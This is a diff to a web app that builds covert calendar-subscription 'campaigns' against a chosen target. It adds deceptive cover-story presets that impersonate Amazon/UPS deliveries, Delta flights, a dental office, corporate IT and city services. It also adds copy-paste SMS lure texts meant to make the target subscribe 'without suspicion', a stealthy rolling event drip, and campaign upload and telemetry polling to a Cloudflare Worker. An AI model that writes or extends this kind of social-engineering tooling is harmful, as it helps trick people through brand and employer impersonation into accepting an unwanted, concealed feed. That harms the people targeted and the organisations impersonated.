@@ -249,7 +249,7 @@
     /* Options Row */
     .options-row {
       display: grid;
-      grid-template-columns: 1fr 1fr;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
       gap: 12px;
     }
 
@@ -984,6 +984,18 @@
             <option value="21">21 Days (Ultra-Ghost)</option>
           </select>
         </div>
+        <div class="form-group">
+          <label style="display:flex; justify-content:space-between; align-items:center;">
+            <span>Anti-Spoil Rolling Drip</span>
+            <span style="font-size:0.68rem; color:#38bdf8; font-weight:700;">100% Stealth</span>
+          </label>
+          <select id="dripHorizonSelect">
+            <option value="14" selected>Rolling 14-Day Drip (Recommended)</option>
+            <option value="21">Rolling 21-Day Drip (3 Weeks Ahead)</option>
+            <option value="30">Rolling 30-Day Drip (1 Month Ahead)</option>
+            <option value="0">Reveal All 100 Events at Once</option>
+          </select>
+        </div>
       </div>
 
       <!-- STEP 1B: TROJAN HORSE SOCIAL ENGINEERING BAIT -->
@@ -993,10 +1005,14 @@
         
         <select id="decoyPresetSelect" style="margin-top: 8px;">
           <option value="directory" selected>📱 Mobile Directory Sync (Corporate IT check)</option>
+          <option value="delivery">📦 Amazon / UPS Delivery Window &amp; Signature Required</option>
+          <option value="flight">✈️ Delta / Airline Flight Itinerary &amp; Gate Updates</option>
+          <option value="dental">🦷 Family Dental Cleaning &amp; Exam Check-in</option>
           <option value="babyshower">🍼 Sophia's Baby Shower &amp; Registry Updates</option>
           <option value="wedding">💍 Wedding Itinerary &amp; Rehearsal Schedule</option>
           <option value="fantasy">🏈 2026 Fantasy League Draft &amp; Matchups</option>
           <option value="holidays">🏢 Corporate Holidays &amp; Floating Days Sync</option>
+          <option value="trash">🗑️ Municipal Bulk Trash &amp; Recycling Pickup</option>
           <option value="custom">✍️ Fully Custom Cover Story...</option>
         </select>
 
@@ -1226,6 +1242,25 @@
             </div>
           </div>
 
+          <!-- Ready-to-Send Social Engineering SMS Box -->
+          <div style="margin-top:14px; background:rgba(6,182,212,0.08); border:1px solid rgba(6,182,212,0.3); border-radius:12px; padding:14px 16px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; flex-wrap:wrap; gap:6px;">
+              <span style="font-size:0.84rem; font-weight:800; color:#38bdf8; display:flex; align-items:center; gap:6px;">
+                💬 Ready-to-Send Social Engineering Text (Copy &amp; Paste)
+              </span>
+              <span style="font-size:0.7rem; color:var(--subtext);">Send via iMessage, SMS or WhatsApp</span>
+            </div>
+            <p style="font-size:0.75rem; color:#94a3b8; margin-bottom:8px;">
+              Text this exact cover story message to your target so they subscribe without suspicion:
+            </p>
+            <div style="display:flex; gap:8px;">
+              <textarea id="txtInviteSms" readonly style="flex:1; height:68px; background:rgba(0,0,0,0.5); border:1px solid var(--card-border); border-radius:8px; color:#f1f5f9; font-size:0.8rem; padding:8px 10px; font-family:sans-serif; resize:none; line-height:1.4;"></textarea>
+              <button type="button" class="btn-copy" id="btnCopyInviteSms" style="height:68px; padding:0 16px; background:var(--cyan); color:#080c14; font-weight:800; border:none; border-radius:8px; cursor:pointer;">
+                📋 Copy Text
+              </button>
+            </div>
+          </div>
+
           <!-- Secret Pranker Dashboard URL -->
           <div style="margin-top:14px; padding:12px 14px; background:rgba(139,92,246,0.12); border:1px solid rgba(139,92,246,0.3); border-radius:12px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
             <div>
@@ -1285,42 +1320,80 @@
         title: "📱 Enterprise Directory Verification (Active)",
         location: "System Services",
         memo: "Mobile device registered to secure directory synchronization. Routine periodic sync active.",
-        offsetDays: 14
+        offsetDays: 14,
+        sms: "Per corporate IT security memo: Please subscribe to this directory link from your phone to complete your mobile profile verification: {URL}"
+      },
+      delivery: {
+        calName: "Delivery Window Tracking",
+        title: "📦 Express Delivery & Signature Required Window",
+        location: "Home / Front Door",
+        memo: "Signature required upon arrival. Carrier live window syncing to device.",
+        offsetDays: 2,
+        sms: "Hey! I ordered that package to your place, can you subscribe to this delivery calendar so your phone alerts you before the driver needs a signature? {URL}"
+      },
+      flight: {
+        calName: "Delta Flight & Travel Itinerary",
+        title: "✈️ Flight Confirmation & Gate Updates (DL-2849)",
+        location: "Terminal 3 • Gate B22",
+        memo: "Terminal check-in 2 hours prior. Gate and baggage carousel updates automatically sync.",
+        offsetDays: 7,
+        sms: "Here's our shared flight itinerary and gate tracking calendar! Add it to your phone so you get automatic updates if our gate changes: {URL}"
+      },
+      dental: {
+        calName: "Family Health Portal Sync",
+        title: "🦷 Dental Cleaning & Exam Check-in",
+        location: "Suite 400 • Medical Plaza",
+        memo: "Automated patient appointment sync. Arrive 15 minutes prior with insurance card.",
+        offsetDays: 10,
+        sms: "Appointment Sync: Please add this shared appointment calendar to your device to confirm check-in times and instructions: {URL}"
       },
       babyshower: {
         calName: "Sophia's Baby Shower & Registry Updates",
         title: "🍼 Sophia & Mark's Baby Shower (RSVP Confirmed)",
         location: "Oak Ridge Pavilion • Room B",
         memo: "Venue: Oak Ridge Pavilion. Gift registry items and schedule updates syncing to device.",
-        offsetDays: 14
+        offsetDays: 14,
+        sms: "Hey! Here's the shared calendar for the baby shower & registry deadlines, subscribe so you have all the dates handy: {URL}"
       },
       wedding: {
         calName: "Miller & Davis Wedding Itinerary",
         title: "💍 Wedding Rehearsal Dinner & Ceremony",
         location: "The Grand Estate Ballroom",
         memo: "Formal wedding weekend itinerary and rehearsal dinner schedule syncing to device.",
-        offsetDays: 21
+        offsetDays: 21,
+        sms: "Here is the shared wedding weekend itinerary calendar so everyone stays on schedule: {URL}"
       },
       fantasy: {
         calName: "2026 Fantasy League Draft & Matchups",
         title: "🏈 League Draft Party & Week 1 Kickoff",
         location: "Draft Room Live",
         memo: "League matchups and waiver wire deadlines syncing. Draft order finalized.",
-        offsetDays: 7
+        offsetDays: 7,
+        sms: "Yo, here's the fantasy league draft and matchup sync link for your calendar, add it so you don't miss kickoff: {URL}"
       },
       holidays: {
         calName: "Corporate Holidays & Office Closures",
         title: "🏢 Corporate Office Closed - Floating Holiday",
         location: "All Corporate & Regional Offices",
         memo: "Official company holiday and office closure calendar. Mandatory remote calendar sync.",
-        offsetDays: 30
+        offsetDays: 30,
+        sms: "Here is the updated company floating holiday and office closure calendar for your phone: {URL}"
+      },
+      trash: {
+        calName: "City Utility & Services Sync",
+        title: "🗑️ Bi-Weekly Bulk Trash & Recycling Pickup",
+        location: "Curbside Collection",
+        memo: "Place bins on curb by 7:00 AM. Bulk items and recycling schedule verified.",
+        offsetDays: 4,
+        sms: "Hey, here is the city bulk trash and recycling calendar link so we know which weeks are bulk pickup: {URL}"
       },
       custom: {
-        calName: "Jack's 30th Birthday Trip Itinerary",
-        title: "✈️ Flight Arrival & Check-In",
+        calName: "Group Weekend Trip Itinerary",
+        title: "✈️ Weekend Trip Check-In & Schedule",
         location: "Terminal 2 / Resort Lobby",
         memo: "Weekend itinerary and group schedule syncing to device.",
-        offsetDays: 14
+        offsetDays: 14,
+        sms: "Hey, subscribe to this shared calendar link so you have the schedule: {URL}"
       }
     };
 
@@ -1934,6 +2007,8 @@ ABSOLUTE RULES:
       try {
         // 1. Save campaign payload to Cloudflare Worker
         const cleanUrl = CLOUDFLARE_WORKER_URL.replace(/\/+$/, "");
+        const dripDays = parseInt(document.getElementById("dripHorizonSelect")?.value || "14", 10);
+
         const saveRes = await fetch(`${cleanUrl}/api/campaigns`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -1948,6 +2023,7 @@ ABSOLUTE RULES:
             decoyLocation,
             decoyMemo,
             decoyDate,
+            dripDays,
           })
         });
 
@@ -2073,6 +2149,19 @@ ABSOLUTE RULES:
       // Render crisp QR code pointing to final WebCal URL
       const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=4&data=${encodeURIComponent(finalWebcal)}`;
       document.getElementById("missionQrImage").src = qrApiUrl;
+
+      // Populate Ready-to-Send Social Engineering SMS
+      const selectedPresetKey = document.getElementById("decoyPresetSelect")?.value || "directory";
+      const presetData = DECOY_PRESETS[selectedPresetKey] || DECOY_PRESETS.directory;
+      const rawSms = presetData.sms || "Hey, subscribe to this shared calendar link so you stay updated: {URL}";
+      const inviteSms = rawSms.replace("{URL}", finalWebcal);
+      const txtSms = document.getElementById("txtInviteSms");
+      if (txtSms) txtSms.value = inviteSms;
+
+      const btnCopySms = document.getElementById("btnCopyInviteSms");
+      if (btnCopySms) {
+        btnCopySms.onclick = () => copyText(inviteSms, btnCopySms);
+      }
     }
 
     async function pollTelemetry(campaignId) {
